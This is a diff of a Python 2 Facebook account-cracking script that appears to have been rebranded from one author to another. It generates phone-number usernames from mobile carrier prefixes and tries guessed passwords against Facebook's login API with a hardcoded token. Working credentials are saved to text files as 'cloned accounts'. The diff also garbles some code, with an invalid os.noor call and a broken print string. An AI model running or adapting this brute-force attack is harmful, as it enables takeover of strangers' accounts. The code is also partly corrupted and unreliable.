@@ -72,11 +72,11 @@ def Style_profaisor(z):
         time.sleep(0.1)
     
 
-#Mking Youtube 
+#Dr Noor 
 
-Mking_youtube = random.choice(["https://youtube.com/channel/Dr_Noor_Afridi"])
+Dr_noor = random.choice(["https://youtube.com/channel/Dr_Noor_Afridi"])
 
-youtuber = Mking_youtube
+youtuber = Dr_noor
 
 def youtube():
 	Style_profaisor("  please subscribe youtube author :) Thank you")
@@ -98,7 +98,7 @@ vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 os.system('clear')
 
-#Mking Logo
+#Afridi Logo
 logo ="""
 \033[1;91m$$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$\  \033[1;0m
 \033[1;91m$$$\  $$ |$$  __$$\ $$  __$$\ $$  __$$\   \033[1;0m
@@ -112,8 +112,8 @@ logo ="""
 \033[1;91m Author      : Dr Noor Afridi
 \033[1;91m GitHub      : https://github.com/Dr-Noor-AfriDi
 \033[1;91m YouTube     : Dr Noor Afridi
-\033[1;91m Telegram CH   : https://t.me/@socialmediahacker1
-\033[1;91m TLEGRAM GP    : https://t.me/@pubglitehacker0
+\033[1;91m Telegram CH : https://t.me/@socialmediahacker1
+\033[1;91m TLEGRAM GP  : https://t.me/@pubglitehacker0
 \033[1;97m--------------------------------------------------
 """
 
@@ -137,22 +137,22 @@ def Select_menu():
     	telegram()
         os.system('clear')
         print logo 
-        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY MOHAMMAD SULTANI'
-        print '\x1b[1;92m THISE SCRIPT CREATED BY MOHAMMAD SULTANI '
+        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY DR NOOR AFRIDI'
+        print '\x1b[1;92m THISE SCRIPT CREATED BY DR NOOR AFRIDI'
         print '\x1b[1;92m              FREE TOOL  AND   NO  ENCRYPT   '
         print 47 * '\x1b[1;92m\xe2\x96\xac'
         print ''
-        print '\x1b[1;93m \x1b[1;92m ETISALAT       : \x1b[1;92m 88,80,86,87,84,83,82,89,81'
+        print '\x1b[1;93m \x1b[1;92m ARYAN AFRIDI        : \x1b[1;92m 88,80,86,87,84,83,82,89,81'
         print ''
-        print '\x1b[1;93m \x1b[1;92m ROSHAN         : \x1b[1;92m 99,91,92,93,94,96,95,97,98'
+        print '\x1b[1;93m \x1b[1;92m ARYAN ALI           : \x1b[1;92m 99,91,92,93,94,96,95,97,98'
         print ''
-        print '\x1b[1;93m \x1b[1;92m MTN            : \x1b[1;92m 71.72.73.74.75.76.77.78.79'
+        print '\x1b[1;93m \x1b[1;92m CUTE RIDA😆         : \x1b[1;92m 71.72.73.74.75.76.77.78.79'
         print ''
-        print '\x1b[1;93m \x1b[1;92m SALAM          : \x1b[1;92m 31.32.33.34.35.36.37.38.39'
+        print '\x1b[1;93m \x1b[1;92m DR NOOR AFRIDI      : \x1b[1;92m 31.32.33.34.35.36.37.38.39'
         print ''
-        print '\x1b[1;93m \x1b[1;92m AWCC.          : \x1b[1;92m 01.02.03.04.05.06.07.08.09'
+        print '\x1b[1;93m \x1b[1;92m SHAZMA KHAXA        : \x1b[1;92m 01.02.03.04.05.06.07.08.09'
         print ''
-        print 47 * '\x1b[1;92m\xe2\x96\xac'
+        print 47 * '\x1b[1;92m\xe2\x96\MY WIFE LAILA KHAN 🤣
         
         try:
             c = raw_input('\x1b[1;92mChoose code :\x1b[1;92m ')
@@ -185,7 +185,7 @@ def Select_menu():
         user = arg
         
         try:
-            os.mkdir('Mking')
+            os.noor('afridi')
         except OSError:
             pass
 
@@ -195,14 +195,14 @@ def Select_menu():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass1
-                okb = open('Mking.txt', 'a')
+                print ' \x1b[1;92m[NOOR_OK] ' + k + c + user + ' | ' + pass1
+                okb = open('Noor.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass1
-                cps = open('Mking.txt', 'a')
+                print ' \x1b[1;93m[Afridi_CP] ' + k + c + user + ' | ' + pass1
+                cps = open('Afridi.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -211,14 +211,14 @@ def Select_menu():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass2
-                    okb = open('Mking.txt', 'a')
+                    print ' \x1b[1;92m[NOOR_OK] ' + k + c + user + ' | ' + pass2
+                    okb = open('Noor.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass2
-                    cps = open('Mking.txt', 'a')
+                    print ' \x1b[1;93m[AFRIDI_CP] ' + k + c + user + ' | ' + pass2
+                    cps = open('Afridi.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
                     cpb.append(c + user + pass2)
@@ -227,14 +227,14 @@ def Select_menu():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass3
-                        okb = open('Mking.txt', 'a')
+                        print ' \x1b[1;92m[NOOR_OK] ' + k + c + user + ' | ' + pass3
+                        okb = open('Afridi.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass3
-                        cps = open('Mking.txt', 'a')
+                        print ' \x1b[1;93m[AFRIDI_CP] ' + k + c + user + ' | ' + pass3
+                        cps = open('Afridi.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
@@ -243,14 +243,14 @@ def Select_menu():
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass4
-                            okb = open('Mking.txt', 'a')
+                            print ' \x1b[1;92m[NOOR_OK] ' + k + c + user + ' | ' + pass4
+                            okb = open('Afridi.txt', 'a')
                             okb.write(k + c + user + pass4 + '\n')
                             okb.close()
                             oks.append(c + user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass4
-                            cps = open('Mking.txt', 'a')
+                            print ' \x1b[1;93m[AFRIDI_CP] ' + k + c + user + ' | ' + pass4
+                            cps = open('Afridi.txt', 'a')
                             cps.write(k + c + user + pass4 + '\n')
                             cps.close()
                             cpb.append(c + user + pass4)
@@ -259,14 +259,14 @@ def Select_menu():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass5
-                                okb = open('Mking.txt', 'a')
+                                print ' \x1b[1;92m[NOOR_OK] ' + k + c + user + ' | ' + pass5
+                                okb = open('Afridi.txt', 'a')
                                 okb.write(k + c + user + pass5 + '\n')
                                 okb.close()
                                 oks.append(c + user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass5
-                                cps = open('Mking.txt', 'a')
+                                print ' \x1b[1;93m[AFRIDI_CP] ' + k + c + user + ' | ' + pass5
+                                cps = open('Afridi.txt', 'a')
                                 cps.write(k + c + user + pass5 + '\n')
                                 cps.close()
                                 cpb.append(c + user + pass5)
@@ -280,7 +280,7 @@ def Select_menu():
     print 54 * '\x1b[1;92m_'
     print ' \x1b[1;92mThe Process has been Completed ...'
     print ' \x1b[1;92mTotal Ok/Cp : ' + str(len(oks)) + '/' + str(len(cpb))
-    print ' Cloned Accounts Has Been Saved : Mking.txt'
+    print ' Cloned Accounts Has Been Saved : Afridi.txt'
     print ' Note : Cp accounts Will Open after 8/10 days'
     print 54 * '\x1b[1;92m_'
     print ''
